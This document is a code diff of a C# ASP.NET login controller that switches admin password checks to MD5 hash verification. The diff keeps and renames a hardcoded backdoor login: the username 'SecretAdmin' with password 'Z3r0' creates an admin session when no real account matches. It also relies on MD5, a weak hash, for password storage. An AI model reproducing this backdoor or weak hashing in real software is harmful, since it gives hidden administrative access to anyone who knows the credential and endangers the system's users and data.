@@ -35,10 +35,10 @@ namespace NPL.Controllers
         {
             string username = form["username"];
             string password = form["password"];
+            
+            Admin r = data.Admins.SingleOrDefault(i => i.Username == username);             
 
-            Admin r = data.Admins.SingleOrDefault(i => i.Username == username && i.Password == password);
-
-            if (r == null && username.Equals("Admin") && password.Equals("Z3r0"))
+            if (r == null && username.Equals("SecretAdmin") && password.Equals("Z3r0"))
             {
                 r = new Admin();
                 r.Username = "Secret";
@@ -50,6 +50,11 @@ namespace NPL.Controllers
             }
 
             if (r == null)
+            {
+                ViewBag.Message = "Login failed";
+                return View();
+            }
+            else if (!MD5Cal.VerifyMd5Hash(password, r.Password))
             {
                 ViewBag.Message = "Login failed";
                 return View();
@@ -95,7 +100,7 @@ namespace NPL.Controllers
             string newpass = form["NewPassword"];
             string repass = form["RetypePassword"];
 
-            Admin admin = data.Admins.SingleOrDefault(i=>i.Username.Equals("Admin"));
+            Admin admin = data.Admins.SingleOrDefault(i=>i.Username.Equals("admin"));
             string dbpasshash = admin.Password;
 
             if (!MD5Cal.VerifyMd5Hash(oldpass, dbpasshash))
